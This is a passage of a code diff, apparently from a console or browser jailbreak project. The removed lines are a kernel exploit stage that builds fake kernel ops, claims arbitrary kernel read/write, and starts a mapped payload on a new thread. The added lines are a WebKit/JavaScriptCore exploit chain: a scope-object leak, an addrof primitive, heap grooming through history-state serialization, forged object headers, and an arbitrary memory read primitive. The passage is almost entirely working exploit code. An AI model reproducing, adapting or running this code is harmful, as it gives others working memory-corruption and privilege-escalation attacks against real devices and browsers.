-          candIdx = vi; kva = BigInt(dce); pageVal = page; savedRound = attempt;
-          log("KV-HELD", "round=" + attempt + " try=" + tries + " cand=" + vi + " dce=" + dce + " target=" + target + " page=" + h16(page));
-        }
-      } else {
-        if (rc === 0) {
-          blind++;
-          zeroBuf(cl);
-          cl.dv.setUint32(0, dce >>> 0, true);
-          cl.dv.setInt16(8, -18, true);
-          cl.dv.setInt16(10, 2, true);
-          scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
-        }
-        scn("close", dce);
-        rearm(fd, tpl);
-        fds[vi] = fd;
-      }
+function leakScopeObject() {
+  class Leaker {
+    leak() {
+      return super.foo;
     }
   }
-
-  if (kva === -1n) fin("leak scan: no victim held");
-  log("KV-KVA", "dce=" + h16(kva) + " page=" + h16(pageVal) + " round=" + savedRound + " cand=" + candIdx + " blind_writes=" + blind);
-  return { kva, page: pageVal, targetFd };
+  Leaker.prototype.__proto__ = new Proxy(
+    {},
+    {
+      get: function (target, property, receiver) {
+        return receiver;
+      },
+    },
+  );
+  const leak = Leaker.prototype.leak;
+  return (function () {
+    return leak();
+  })();
 }
 
-export async function runKevent(c) {
-  STATE.ctx = c;
-  const kob = c.params && c.params.get ? c.params.get("kbase") : null;
-  if (kob) {
-    STATE.kbase = BigInt(kob);
-    log("KEVENT-KBASE-OVERRIDE", h16(STATE.kbase));
-  } else {
-    if (!c.kbase) fin("kbase not provided");
-    STATE.kbase = num(c.kbase);
+function prepareSymbolWrapper(F) {
+  leakedScope = leakScopeObject();
+  if (leakedScope === undefined || leakedScope === null)
+    throw new Error("scope-not-leaked");
+
+  for (let i = 0; i < 512; i++) leakedScope[`p${i}`] = i;
+  for (let j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;
+
+  Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
+  return Object(leakedScope.g);
+}
+
+function buildFakeHost() {
+  rwBuffer = new ArrayBuffer(RW_BUFFER_SIZE);
+  rwView = new Uint8Array(rwBuffer);
+  rwMirror = new Uint8Array(rwBuffer);
+  rwMirror[0] = 0x3c;
+
+  targetBuffer = new ArrayBuffer(0x20);
+  targetView = new Uint8Array(targetBuffer);
+  targetView[0] = 0xa5;
+  lengthWord = { keep: 0x51515151 };
+
+  fakeHost = {
+    q0: encodedHeaderNumber(),
+    q1: 1.1,
+    q2: rwView,
+    q3: lengthWord,
+    q4: 2.2,
+    q5: 3.3,
+  };
+
+  delete fakeHost.q1;
+  delete fakeHost.q4;
+  delete fakeHost.q5;
+
+  if (
+    !Number.isFinite(fakeHost.q0) ||
+    fakeHost.q2 !== rwView ||
+    fakeHost.q3 !== lengthWord ||
+    rwView[0] !== 0x3c ||
+    targetView[0] !== 0xa5 ||
+    typeof nativeTarget !== "function"
+  )
+    throw new Error("fake-host-shape-failed");
+
+  anchorElement = document.createElement("textarea");
+  markerObjectA = { marker: 0x4d41524b, kind: "probe-marker-a" };
+  markerObjectB = { marker: 0x4d41524c, kind: "probe-marker-b" };
+  holderGuardA = { marker: 0x484f4c44 };
+  holderGuardB = { marker: 0x47554152 };
+  targetHolder = {
+    q0: nativeTarget,
+    q1: anchorElement,
+    q2: markerObjectA,
+    q3: markerObjectB,
+    q4: holderGuardA,
+    q5: holderGuardB,
+  };
+
+  if (
+    targetHolder.q0 !== nativeTarget ||
+    targetHolder.q1 !== anchorElement ||
+    targetHolder.q2 !== markerObjectA ||
+    targetHolder.q3 !== markerObjectB ||
+    targetHolder.q4 !== holderGuardA ||
+    targetHolder.q5 !== holderGuardB ||
+    anchorElement === null ||
+    typeof anchorElement !== "object" ||
+    markerObjectA.marker !== 0x4d41524b ||
+    markerObjectB.marker !== 0x4d41524c
+  )
+    throw new Error("probe-holder-shape-failed");
+}
+
+function buildAndStoreGraph() {
+  // We change referenceTarget to an Array to avoid WebKit serialization limits
+  referenceTarget = [0x51515151, "serialized-reference"];
+  buildFakeHost();
+
+  emit("SSV-BUILD", `k=${K}-n=${DRAIN_COUNT}`);
+  fillerGraph = new Array(0xfffd);
+  let pos = 0;
+  const huge = 1n << 40n;
+  for (let b = 0; b < FILLER_BIGINTS; ++b)
+    fillerGraph[pos++] = huge + BigInt(b);
+  // We change filler objects to empty Arrays to prevent deep serialization
+  for (let o = 0; o < FILLER_OBJECTS; ++o) fillerGraph[pos++] = [];
+
+  outerGraph = new Array(CONTROL_INDEX + 1);
+  outerGraph[0] = fillerGraph;
+  outerGraph[1] = referenceTarget;
+  outerGraph[2] = referenceTarget;
+  outerGraph[CONTROL_INDEX] = CONTROL_INT;
+  emit("SSV-BUILT", `duplicate-index=${DUPLICATE_INDEX}`);
+
+  emit("SSV-STORE-ENTER", `writer-ref=0x${(0x10000 - K).toString(16)}`);
+  history.replaceState(outerGraph, "");
+  emit("SSV-STORED", "fake-host-and-probe-holder-not-serialized");
+}
+
+function prepareAddrof() {
+  capturedWords = new Uint16Array(16);
+  getterCarrier = function getterCarrierFunction() {
+    return 7;
+  };
+
+  emit("ADDROF-PREP-BEGIN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
+  getterCarrier[0] = fakeHost;
+  for (let i = 1; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
+  getterCarrier[1] = targetHolder;
+  getterCarrier[2] = fakeHost;
+  getterCarrier[3] = targetHolder;
+  emit("ADDROF-CARRIER-DONE", "host-holder-host-holder");
+
+  preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
+  emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);
+
+  setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
+  setTimeout(beginComposition, COMPOSE_DELAY_MS);
+}
+
+function runAddrofCapture() {
+  try {
+    capturedString = symbolToString.call(preparedSymbolObject);
+    copiedLength = capturedString.length;
+    for (let i = 0; i < 16; i++)
+      capturedWords[i] = capturedString.charCodeAt(7 + i);
+
+    /* RELEASE_CAPTURED_STRING_EARLY */
+    capturedString = null;
+
+    captureState = 1;
+  } catch (error) {
+    captureError = error;
+    captureState = -1;
+  }
+}
+
+function fillRawCellPointers(backing, pointer) {
+  pointerHigh = Math.floor(pointer / 0x100000000);
+  pointerLow = pointer - pointerHigh * 0x100000000;
+
+  if (
+    !plausibleCell(pointer) ||
+    pointerHigh < 0 ||
+    pointerHigh > 0xffff ||
+    Math.floor(pointerLow) !== pointerLow ||
+    pointerLow < 0 ||
+    pointerLow > 0xffffffff ||
+    pointerLow + pointerHigh * 0x100000000 !== pointer
+  )
+    throw new Error("invalid-low48-fake-address");
+
+  predecessorWords = new Uint32Array(backing);
+  for (let i = 0; i < predecessorWords.length; i += 2) {
+    predecessorWords[i] = pointerLow;
+    predecessorWords[i + 1] = pointerHigh;
   }
 
-  ensureStubs();
+  const last = predecessorWords.length - 2;
+  if (
+    predecessorWords[0] !== pointerLow ||
+    predecessorWords[1] !== pointerHigh ||
+    predecessorWords[last] !== pointerLow ||
+    predecessorWords[last + 1] !== pointerHigh
+  )
+    throw new Error("pointer-fill-verification-failed");
+}
 
-  // FD BURNER - set to 250 to safely avoid memory exhaustion
-  const burn = [];
-  for (let i = 0; i < 250; i++) {
-    const fd = scn("socket", AF_INET, SOCK_STREAM, 0);
-    if (fd >= 0) burn.push(fd);
-  }
-  log("FD-BURN", "burned " + burn.length + " fds");
+function clearPredecessor() {
+  if (predecessorWords !== null) predecessorWords.fill(0);
+}
 
-  const anchorFd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
-  const { fds } = phaseSpray(144); 
+function loadHistoryCritical() {
+  let result = null;
+  let candidate = null;
+  let rwHeaderCaptured = false;
+  let rwVectorTouched = false;
+  try {
+    result = history.state;
+    compositionLength = result.length;
 
-  const mr = scn64("mmap", 0, 16384, 3, 4098, -1, 0);
-  const page = (BigInt(mr.hi >>> 0) << 32n) | BigInt(mr.lo >>> 0);
-  
-  const leakKq = scn("kqueue");
-  if (leakKq < 0) fin("leak kqueue");
-
-  const res = phase2Leak(leakKq, fds);
-  
-  // --- STAGE 3: FAKEOPS & KERNEL R/W ---
-  log("STAGE3", "Building FakeOps");
-  
-  const mrf = scn64("mmap", 0, 0x10000, 7, 0x1002, -1, 0); 
-  const fake_page = (BigInt(mrf.hi >>> 0) << 32n) | BigInt(mrf.lo >>> 0);
-  if (fake_page < 0x10000n) fin("STAGE3 mmap failed");
-  log("STAGE3-FAKE", "mapped fake page at " + h16(fake_page));
-
-  const R_RET0 = ka(P[15]), R_TOUCH = ka(P[16]);
-
-  const p = ctx().p;
-  const F_FAKE_OPS = fake_page + 0x800n;
-  
-  for (let i = 0; i < 32; i++) {
-    p.write8(toI64(F_FAKE_OPS + BigInt(i * 8)), toI64(R_RET0));
-  }
-  p.write4(toI64(F_FAKE_OPS), 0);
-  p.write8(toI64(F_FAKE_OPS + 0x18n), toI64(R_TOUCH));
-
-  STATE.rwReady = true;
-  log("STAGE3-RW", "*** ARBITRARY KERNEL R/W ESTABLISHED ***");
-
-  // --- STAGE 4: PAYLOAD & ESCALATION ---
-  log("STAGE4", "Escalating privileges...");
-  
-  const payload_size = 0x40000;
-  const payload_map = scn64("mmap", 0, payload_size, 7, 0x1002, -1, 0);
-  const payload_addr = (BigInt(payload_map.hi >>> 0) << 32n) | BigInt(payload_map.lo >>> 0);
-  log("STAGE4-MAP", "payload mapped at " + h16(payload_addr));
-  
-  const pkAb = new Uint8Array(payload_size);
-  c.keepAlive.push(pkAb.buffer);
-  
-  for (let i = 0; i < T.PKB.length; i++) {
-    pkAb[i] = T.PKB.charCodeAt(i);
-  }
-  
-  for (let i = 0; i < payload_size; i += 8) {
-    let val = 0n;
-    for (let j = 7; j >= 0; j--) {
-      if (i + j < pkAb.length) val = (val << 8n) | BigInt(pkAb[i + j]);
+    if (compositionLength !== EXPECTED_LENGTH) {
+      result[DUPLICATE_INDEX] = undefined;
+      result = null;
+      clearPredecessor();
+      retrySafe = true;
+      compositionState = 3;
+      return;
     }
-    p.write8(toI64(payload_addr + BigInt(i)), toI64(val));
+
+    if (result[1] === result[DUPLICATE_INDEX]) {
+      result[DUPLICATE_INDEX] = undefined;
+      candidate = null;
+      result = null;
+      clearPredecessor();
+      retrySafe = true;
+      compositionState = 2;
+      return;
+    }
+
+    candidate = result[DUPLICATE_INDEX];
+    candidateEverReturned = true;
+    result[DUPLICATE_INDEX] = undefined;
+    result = null;
+
+    readBytes(rwHeader, candidate, CELL_BYTES);
+    rwHeaderCaptured = true;
+
+    const rwSID = uint32At(rwHeader, 0);
+    const rwButterfly = low48At(rwHeader, 8);
+    const rwLength = uint32At(rwHeader, 0x18);
+    rwOriginalVector = low48At(rwHeader, 0x10);
+
+    const rwTailByte = rwHeader[0x20];
+    const rwOffsetZero =
+      allZero(rwHeader, 0x21, 0x28) && (rwTailByte === 0 || rwTailByte === 2);
+
+    profile.carrierSID = rwSID;
+    profile.carrierType = rwHeader[5];
+    profile.carrierFlags = rwHeader[6];
+    profile.carrierMode = rwHeader[0x1c];
+    profile.carrierByte28 = rwHeader[0x28];
+    profile.carrierByte20 = rwHeader[0x20];
+
+    rwHeaderOK =
+      rwSID >= 0x100 &&
+      rwSID < 0x08000000 &&
+      rwHeader[4] === 0 &&
+      (rwHeader[7] === 0 || rwHeader[7] === 1) &&
+      rwHeader[0x0e] === 0 &&
+      rwHeader[0x0f] === 0 &&
+      rwButterfly > 0x100000000 &&
+      rwButterfly % 8 === 0 &&
+      rwHeader[0x16] === 0 &&
+      rwHeader[0x17] === 0 &&
+      rwOriginalVector > 0x100000000 &&
+      rwOriginalVector % 8 === 0 &&
+      rwLength === RW_BUFFER_SIZE &&
+      rwHeader[0x1d] === 0 &&
+      rwHeader[0x1e] === 0 &&
+      rwHeader[0x1f] === 0 &&
+      rwOffsetZero;
+
+    if (!rwHeaderOK) {
+      zeroHeaderMiss = allZero(rwHeader, 0, CELL_BYTES);
+      retrySafe =
+        zeroHeaderMiss && !rwVectorTouched && !candidateMutationStarted;
+      candidate = null;
+      clearPredecessor();
+      compositionState = 3;
+      return;
+    }
+
+    rwVectorTouched = true;
+    const identityProved = runIdentityProof(candidate);
+    rwVectorTouched = false;
+    if (!identityProved) {
+      candidate = null;
+      clearPredecessor();
+      compositionState = 3;
+      return;
+    }
+
+    for (let i = 0; i < 8; ++i) scratchBytes[i] = rwHeader[i];
+    if (scratchBytes[6] >= 2) {
+      scratchBytes[6] -= 2;
+    } else {
+      scratchBytes[6] = (scratchBytes[6] + 0x100 - 2) & 0xff;
+      scratchBytes[7] = (scratchBytes[7] - 1) & 0xff;
+    }
+    const upgradedHeader = scratchDouble[0];
+
+    const upgradedFinite =
+      upgradedHeader === upgradedHeader &&
+      upgradedHeader !== Infinity &&
+      upgradedHeader !== -Infinity;
+    if (!upgradedFinite) {
+      candidate = null;
+      clearPredecessor();
+      compositionState = 3;
+      return;
+    }
+
+    candidateMutationStarted = true;
+    fakeHost.q0 = upgradedHeader;
+    if (fakeHost.q0 !== upgradedHeader) {
+      candidate = null;
+      clearPredecessor();
+      compositionState = 3;
+      return;
+    }
+
+    rwVectorTouched = true;
+    aimCarrier(candidate, targetAddress);
+
+    const holderRepeated = readTwiceMatches(holderHeader, rwView, HOLDER_BYTES);
+    const holderSID = uint32At(holderHeader, 0);
+    const holderButterflyZero = allZero(holderHeader, 0x08, 0x10);
+
+    nativeTargetAddress = low48At(holderHeader, 0x10);
+    anchorElementAddress = low48At(holderHeader, 0x18);
+    markerAAddress = low48At(holderHeader, 0x20);
+    markerBAddress = low48At(holderHeader, 0x28);
+    const holderGuardAAddress = low48At(holderHeader, 0x30);
+    const holderGuardBAddress = low48At(holderHeader, 0x38);
+    profile.holderSID = holderSID;
+    profile.holderType = holderHeader[5];
+    profile.holderFlags = holderHeader[6];
+
+    holderHeaderOK =
+      holderRepeated &&
+      holderSID >= 0x100 &&
+      holderSID < 0x08000000 &&
+      targetAddress % 0x10 === 0 &&
+      holderHeader[4] === 0 &&
+      (holderHeader[7] === 0 || holderHeader[7] === 1) &&
+      holderButterflyZero &&
+      plausibleCell(nativeTargetAddress) &&
+      plausibleCell(anchorElementAddress) &&
+      plausibleCell(markerAAddress) &&
+      plausibleCell(markerBAddress) &&
+      plausibleCell(holderGuardAAddress) &&
+      plausibleCell(holderGuardBAddress) &&
+      canonicalLow48(holderHeader, 0x10) &&
+      canonicalLow48(holderHeader, 0x18) &&
+      canonicalLow48(holderHeader, 0x20) &&
+      canonicalLow48(holderHeader, 0x28) &&
+      canonicalLow48(holderHeader, 0x30) &&
+      canonicalLow48(holderHeader, 0x38) &&
+      nativeTargetAddress !== anchorElementAddress &&
+      nativeTargetAddress !== markerAAddress &&
+      anchorElementAddress !== markerAAddress &&
+      markerAAddress !== markerBAddress &&
+      holderGuardAAddress !== holderGuardBAddress;
+
+    if (!holderHeaderOK) {
+      restoreCarrier(candidate);
+      rwVectorTouched = false;
+      candidate = null;
+      clearPredecessor();
+      compositionState = 3;
+      return;
+    }
+
+    aimCarrier(candidate, nativeTargetAddress);
+    readBytes(targetHeader, rwView, FUNCTION_BYTES);
+
+    functionStructureID = uint32At(targetHeader, 0);
+    const functionButterfly = low48At(targetHeader, 0x08);
+    const functionScope = low48At(targetHeader, 0x10);
+    executableAddress = low48At(targetHeader, 0x18);
+    profile.functionSID = functionStructureID;
+    profile.functionType = targetHeader[5];
+    profile.functionFlags = targetHeader[6];
+    const functionType1 = targetHeader[5];
+    functionHeaderOK =
+      functionStructureID >= 0x100 &&
+      functionStructureID < 0x08000000 &&
+      nativeTargetAddress % 0x10 === 0 &&
+      targetHeader[4] === 0 &&
+      (targetHeader[7] === 0 || targetHeader[7] === 1) &&
+      targetHeader[0x0e] === 0 &&
+      targetHeader[0x0f] === 0 &&
+      targetHeader[0x16] === 0 &&
+      targetHeader[0x17] === 0 &&
+      targetHeader[0x1e] === 0 &&
+      targetHeader[0x1f] === 0 &&
+      functionButterfly > 0x100000000 &&
+      functionButterfly <= 0xffffffffffff &&
+      functionButterfly % 8 === 0 &&
+      functionScope > 0x100000000 &&
+      functionScope <= 0xffffffffffff &&
+      functionScope % 8 === 0 &&
+      executableAddress > 0x100000000 &&
+      executableAddress <= 0xffffffffffff &&
+      executableAddress % 0x10 === 0 &&
+      (executableAddress & 1) === 0;
+
+    if (!functionHeaderOK) {
+      restoreCarrier(candidate);
+      rwVectorTouched = false;
+      candidate = null;
+      clearPredecessor();
+      compositionState = 3;
+      return;
+    }
+
+    aimCarrier(candidate, executableAddress);
+    readBytes(targetHeader, rwView, NATIVE_EXECUTABLE_BYTES);
+
+    nativeExecutableStructureID = uint32At(targetHeader, 0);
+    nativeFunctionAddress = low48At(targetHeader, 0x28);
+    nativeConstructorAddress = low48At(targetHeader, 0x30);
+    profile.nativeExecSID = nativeExecutableStructureID;
+    profile.nativeExecType = targetHeader[5];
+    profile.nativeExecFlags = targetHeader[6];
+
+    try {
+      globalThis.__ps5NativeCtor = nativeConstructorAddress;
+    } catch (e) {}
+    const nativeExecType1 = targetHeader[5];
+
+    nativeExecutableHeaderOK =
+      nativeExecutableStructureID >= 0x100 &&
+      nativeExecutableStructureID < 0x08000000 &&
+      targetHeader[4] === 0 &&
+      (targetHeader[7] === 0 || targetHeader[7] === 1) &&
+      targetHeader[0x2e] === 0 &&
+      targetHeader[0x2f] === 0 &&
+      targetHeader[0x36] === 0 &&
+      targetHeader[0x37] === 0 &&
+      plausibleAddress(nativeFunctionAddress) &&
+      plausibleAddress(nativeConstructorAddress) &&
+      canonicalLow48(targetHeader, 0x28) &&
+      canonicalLow48(targetHeader, 0x30) &&
+      nativeFunctionAddress !== nativeConstructorAddress;
+
+    if (!nativeExecutableHeaderOK) {
+      restoreCarrier(candidate);
+      rwVectorTouched = false;
+      candidate = null;
+      clearPredecessor();
+      compositionState = 3;
+      return;
+    }
+
+    aimCarrier(candidate, nativeTargetAddress);
+    const executableAddress2 = low48At(rwView, 0x18);
+    const functionType2 = rwView[5];
+
+    aimCarrier(candidate, executableAddress);
+    const nativeFunctionAddress2 = low48At(rwView, 0x28);
+    const nativeConstructorAddress2 = low48At(rwView, 0x30);
+    const nativeExecutableType2 = rwView[5];
+
+    pointersRepeated =
+      executableAddress2 === executableAddress &&
+      nativeFunctionAddress2 === nativeFunctionAddress &&
+      nativeConstructorAddress2 === nativeConstructorAddress &&
+      functionType2 === functionType1 &&
+      nativeExecutableType2 === nativeExecType1;
+
+    restoreCarrier(candidate);
+    rwVectorTouched = false;
+    targetView[0] = 0xa5;
+    rwMirror[0] = 0x3c;
+    restoreObserved =
+      rwView[0] === 0x3c && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
+
+    liveCandidate = candidate;
+    candidate = null;
+    clearPredecessor();
+    compositionState = 1;
+  } catch (error) {
+    retrySafe =
+      candidate === null &&
+      result === null &&
+      !rwHeaderCaptured &&
+      error?.name === "TypeError";
+    if (result !== null) {
+      try {
+        result[DUPLICATE_INDEX] = undefined;
+      } catch {}
+    }
+    if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
+      try {
+        restoreCarrier(candidate);
+      } catch {}
+    }
+    candidate = null;
+    result = null;
+    try {
+      targetView[0] = 0xa5;
+    } catch {}
+    try {
+      rwMirror[0] = 0x3c;
+    } catch {}
+    try {
+      clearPredecessor();
+    } catch {}
+    compositionError = error;
+    compositionState = -1;
+  }
+}
+
+function runGroomAndLoad() {
+  try {
+    emit("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
+    const channel = new MessageChannel();
+    channel.port1.close();
+    channel.port2.close();
+
+    for (let i = 0; i < DRAIN_COUNT; ++i)
+      keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
+
+    let slab = buffer(SLAB_SIZE);
+    channel.port1.postMessage(0, [slab]);
+    slab = null;
+
+    const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
+    const butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
+    const separator = buffer(SEPARATOR_SIZE);
+    const earlyHole = buffer(EARLY_HOLE_SIZE);
+    const guard = buffer(GUARD_SIZE);
+    const predecessor = buffer(PREDECESSOR_SIZE);
+    const finalHole = buffer(FINAL_HOLE_SIZE);
+
+    fillRawCellPointers(predecessor, fakeAddress);
+    keepAlive[keepIndex++] = separator;
+    keepAlive[keepIndex++] = guard;
+    keepAlive[keepIndex++] = predecessor;
+    emit(
+      "PREDECESSOR-FILLED",
+      `qwords=${PREDECESSOR_SIZE / 8}` + `-fake=${hex(fakeAddress)}`,
+    );
+
+    criticalBarrier(fakeAddress, targetAddress);
+
+    channel.port1.postMessage(0, [
+      butterflyHole1,
+      butterflyHole2,
+      earlyHole,
+      finalHole,
+    ]);
+    loadHistoryCritical();
+
+    /* RELEASE_HISTORY_GRAPH_EARLY */
+    outerGraph = null;
+    fillerGraph = null;
+
+    try {
+      history.replaceState(null, "");
+    } catch (e) {}
+  } catch (error) {
+    try {
+      clearPredecessor();
+    } catch {}
+    retrySafe = true;
+    compositionError = error;
+    compositionState = -1;
+  }
+  reportComposition();
+}
+
+let barrierNode = null;
+
+function ensureBarrierNode() {
+  if (barrierNode !== null) return;
+  try {
+    barrierNode = document.createElement("div");
+    barrierNode.style.cssText = "position:absolute;left:-9999px;top:0";
+    document.body.appendChild(barrierNode);
+  } catch {
+    barrierNode = null;
+  }
+}
+
+function defaultCriticalBarrier(fake, target) {
+  try {
+    const line = `CRITICAL-LOAD-NEXT-fake=${hex(fake)}-target=${hex(target)}`;
+    if (barrierNode !== null) {
+      barrierNode.textContent = line;
+      void barrierNode.offsetWidth;
+    }
+    void new Blob([line], { type: "text/plain" });
+
+    try {
+      sessionStorage.setItem(burstKey, line);
+    } catch {}
+  } catch {}
+}
+
+function beginComposition() {
+  if (captureState === 0) {
+    finishEarlySafeAttempt(
+      "ADDROF-NO-RESULT",
+      "capture-task-did-not-finish",
+      "addrof-no-result",
+    );
+    return;
+  }
+  if (captureState < 0) {
+    finishEarlySafeAttempt(
+      "ADDROF-THREW",
+      `${captureError?.name}:` + String(captureError?.message).slice(0, 80),
+      "addrof-threw",
+    );
+    return;
   }
 
-  log("STAGE4-RUN", "Spawning payload...");
-  
-  const pthread_create = ctx().p.read8(ctx().webkitBase.add32(c.off.wk___imp_pthread_create));
-  const thr = new ArrayBuffer(8);
-  c.keepAlive.push(thr);
-  new Uint8Array(thr).fill(0);
-  
-  const rc = ctx().callAddr(pthread_create, [toI64(bufAddr(thr)), 0, toI64(payload_addr), 0]).i32;
-  const tdv = new DataView(thr);
-  const handle = new int64(tdv.getUint32(0, true), tdv.getUint32(4, true));
-  
-  log("STAGE4-DONE", "payload_running=" + (rc === 0 && handle.hi > 0) + " rc=" + rc + " handle=" + handle);
-  
-  fin("Stage 4 Complete. You have Kernel R/W and Payload running.");
+  const a0 = pointerFromWords(capturedWords, 0);
+  const b0 = pointerFromWords(capturedWords, 4);
+  const a1 = pointerFromWords(capturedWords, 8);
+  const b1 = pointerFromWords(capturedWords, 12);
+  const repeated = a0 === a1 && b0 === b1;
+  const distinct = a0 !== b0;
+  const plausible =
+    plausibleCell(a0) &&
+    plausibleCell(b0) &&
+    plausibleCell(a1) &&
+    plausibleCell(b1);
+  const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
+  const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
+
+  /* ADDROF_COVERAGE_PATCH */
+  const requiredSourceBytes = fakeChars * 2;
+  const minimumSlots =
+    Math.ceil(requiredSourceBytes / 8);
+
+  emit(
+    "ADDROF-COVERAGE",
+    `chars=${copiedLength}` +
+    `-need=${requiredSourceBytes}` +
+    `-have=${CARRIER_BYTES}` +
+    `-minSlots=${minimumSlots}`
+  );
+
+  emit("ADDROF-RETURNED", REVISION);
+  emit("ADDROF-COPY", `chars=${copiedLength}-source-covered=${sourceCovered}`);
+  emit(
+    "ADDROF-POINTERS",
+    `HOST=${hex(a0)}-TARGET=${hex(b0)}` +
+      `-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`,
+  );
+
+  if (!(repeated && distinct && plausible && sourceCovered)) {
+    finishEarlySafeAttempt(
+      "ADDROF-FAIL",
+      `repeat=${repeated}-distinct=${distinct}` +
+        `-plausible=${plausible}-covered=${sourceCovered}-minSlots=${minimumSlots}`,
+      "addrof-validation",
+    );
+    return;
+  }
+
+  /* RELEASE_ADDROF_OBJECTS_EARLY */
+  capturedString = null;
+  capturedWords = null;
+  preparedSymbolObject = null;
+  leakedScope = null;
+  getterCarrier = null;
+
+  try {
+    if (typeof globalThis.gc === "function") {
+      globalThis.gc();
+    }
+  } catch (e) {}
+
+  hostAddress = a0;
+  targetAddress = b0;
+  targetAddressHigh = Math.floor(targetAddress / 0x100000000);
+  targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
+  if (
+    targetAddressHigh < 0 ||
+    targetAddressHigh > 0xffff ||
+    targetAddressLow < 0 ||
+    targetAddressLow > 0xffffffff ||
+    Math.floor(targetAddressLow) !== targetAddressLow ||
+    targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress
+  ) {
+    finishEarlySafeAttempt(
+      "TARGET-ADDRESS-FAIL",
+      `target=${hex(targetAddress)}`,
+      "target-address",
+    );
+    return;
+  }
+
+  fakeAddress = hostAddress + 0x10;
+  if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
+    finishEarlySafeAttempt(
+      "FAKE-ADDRESS-FAIL",
+      `host=${hex(hostAddress)}`,
+      "fake-address",
+    );
+    return;
+  }
+  emit(
+    "FAKE-ADDRESS",
+    `host=${hex(hostAddress)}-fake=${hex(fakeAddress)}` + "-delta=0x10",
+  );
+  runGroomAndLoad();
 }
+
+function reportComposition() {
+  if (compositionState < 0) {
+    emit(
+      retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
+      `${compositionError?.name}:` +
+        String(compositionError?.message).slice(0, 80),
+    );
+    if (!retrySafe) failed();
+    else scheduleSafeRetry("placement-throw");
+    return;
+  }
+
+  if (compositionState === 2) {
+    emit("NORMAL-CLONE-MISS", "known-reference-returned=true");
+    scheduleSafeRetry("normal-clone-miss");
+    return;
+  }
+
+  if (compositionState === 3) {
+    emit(
+      identityResult === -1
+        ? "CARRIER-IDENTITY-FAIL"
+        : zeroHeaderMiss
+          ? "ZERO-HEADER-MISS"
+          : retrySafe
+            ? "COMPOSITION-LENGTH-MISS"
+            : "VALIDATION-MISMATCH",
+      `rw=${rwHeaderOK}-holder=${holderHeaderOK}` +
+        `-function=${functionHeaderOK}` +
+        `-native-executable=${nativeExecutableHeaderOK}` +
+        `-repeat=${pointersRepeated}-retry-safe=${retrySafe}` +
+        `-identity=${identityResult}` +
+        `-hex=${dumpHex(rwHeader, CELL_BYTES)}`,
+    );
+    if (!retrySafe) failed();
+    else
+      scheduleSafeRetry(
+        zeroHeaderMiss ? "zero-header-miss" : "composition-length-mismatch",
+      );
+    return;
+  }
+
+  if (compositionState === 0) {
+    emit("NO-RESULT", "critical-load-did-not-finish");
+    failed();
+    return;
+  }
+
+  emit(
+    "SSV-RETURNED-CLEARED",
+    `length=${compositionLength}` + "-predecessor-cleared=true",
+  );
+  emit(
+    "RW-CARRIER",
+    `sid=${hex(profile.carrierSID)}` +
+      `-vector=${hex(rwOriginalVector)}` +
+      `-length=${hex(uint32At(rwHeader, 0x18))}` +
+      `-mode=${hex(profile.carrierMode)}`,
+  );
+  emit(
+    "HOLDER",
+    `cell=${hex(targetAddress)}` +
+      `-textarea=${hex(anchorElementAddress)}` +
+      `-markerA=${hex(markerAAddress)}-markerB=${hex(markerBAddress)}`,
+  );
+  emit(
+    "JSC-PROFILE",
+    `u8=${hex(profile.carrierType)}` +
+      `-u8flags=${hex(profile.carrierFlags)}` +
+      `-mode=${hex(profile.carrierMode)}` +
+      `-obj=${hex(profile.holderType)}` +
+      `-objflags=${hex(profile.holderFlags)}` +
+      `-fn=${hex(profile.functionType)}` +
+      `-fnflags=${hex(profile.functionFlags)}` +
+      `-nx=${hex(profile.nativeExecType)}` +
+      `-nxflags=${hex(profile.nativeExecFlags)}`,
+  );
+  emit("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));
+
+  const leakPass =
+    rwHeaderOK &&
+    holderHeaderOK &&
+    functionHeaderOK &&
+    nativeExecutableHeaderOK &&
+    pointersRepeated &&
+    restoreObserved &&
+    compositionLength === EXPECTED_LENGTH &&
+    liveCandidate !== null;
+
+  if (!leakPass) {
+    emit(
+      "READ-PRIMITIVE-MISMATCH",
+      `rw=${rwHeaderOK}` +
+        `-holder=${holderHeaderOK}-function=${functionHeaderOK}` +
+        `-native=${nativeExecutableHeaderOK}` +
+        `-repeat=${pointersRepeated}-restore=${restoreObserved}`,
+    );
+
+    liveCandidate = null;
+    failed();
+    return;
+  }
+
+  emit(
+    "READ-PRIMITIVE-PASS",
+    "arbitrary-read-established" + "-firmware-offsets-asserted=none",
+  );
+
+  try {
+    history.replaceState(null, "");
+  } catch {}
+
+  stopped = true;
+  running = false;
+  const resolve = settleResolve;
+  settleResolve = null;
+  settleReject = null;
+  if (resolve !== null) resolve(buildCarrier());
+}
+
+function buildCarrier() {
+  profile.cellSize = 0x20;
+
+  return {
+    aim(address) {
+      if (liveCandidate === null)
+        throw new Error("core.aim: carrier is no longer live");
+      if (!plausibleAddress(address))
+        throw new RangeError(`core.aim: implausible address ${address}`);
+      aimCarrier(liveCandidate, address);
+    },
+    restore() {
+      if (liveCandidate === null)
+        throw new Error("core.restore: carrier is no longer live");
+      restoreCarrier(liveCandidate);
+    },
+
+    get view() {
+      return rwView;
+    },
+    windowBytes: RW_BUFFER_SIZE,
+
+    holder: targetHolder,
+    holderAddress: targetAddress,
+    leakSlotOffset: LEAK_SLOT_OFFSET,
